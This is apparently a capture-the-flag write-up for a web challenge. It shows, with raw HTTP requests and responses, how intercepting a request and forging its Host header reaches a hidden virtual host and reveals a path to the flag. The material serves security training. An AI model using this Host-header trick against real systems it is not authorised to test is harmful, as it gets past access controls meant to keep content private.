# Research Materials [499 Points]
You want to get the research materials and find out which part of the development goes wrong. The research materials are hidden in the system topsecret.vaccine.dev. How do you get it? Note : All 403s for this challenge are intended. We've tested it.

http://research.nypinfsecctf.tk/

## Solution

1. We set up a proxy on our browser and burp suite to intercept the request when visiting http://research.nypinfsecctf.tk/, since visting it in the web browser gives a 403 Forbidden error.
```
GET / HTTP/1.1

Host: research.nypinfsecctf.tk

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```
2. Once intercepted, we change the host from research.nypinfsecctf.tk to topsecret.vaccine.dev since this is suggested in the challenge description.
```
Host: topsecret.vaccine.dev
```
3. We then right clicked and select 'Do intercept Response to this request' and forward the configured request to the web browser.
```
HTTP/1.1 200 OK

Server: nginx/1.18.0 (Ubuntu)

Date: Mon, 09 May 2022 03:19:58 GMT

Content-Type: text/html; charset=utf-8

Connection: close

Content-Length: 25



/f/Evommgb5azlyCaYMDHW57Q
```
4. ```/f/Evommgb5azlyCaYMDHW57Q``` looks like a path so we add it to the back of research.nypinfsecctf.tk    

5. We then visit ```research.nypinfsecctf.tk/f/Evommgb5azlyCaYMDHW57Q``` in our web browser (do not need proxy and burp suite anymore), to obtain the flag.
```
Flag: NYP{h0st_h3ad3r_f0rg1ng}
```
